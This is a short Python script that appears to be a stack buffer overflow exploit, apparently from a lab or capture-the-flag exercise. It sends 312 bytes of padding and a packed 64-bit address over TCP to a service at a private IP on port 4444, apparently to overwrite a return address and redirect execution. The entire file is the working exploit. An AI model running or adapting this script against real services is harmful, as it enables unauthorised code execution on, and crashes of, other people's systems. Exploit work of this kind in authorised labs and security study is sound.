import socket
import struct

target_ip = "192.168.88.174"
target_port = 4444

buf = b"A" * 312
buf += struct.pack("<Q", 0x1400014AC)
#buf += b"B" * 8


# Send to target
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, target_port))
sock.sendall(buf)
sock.close()

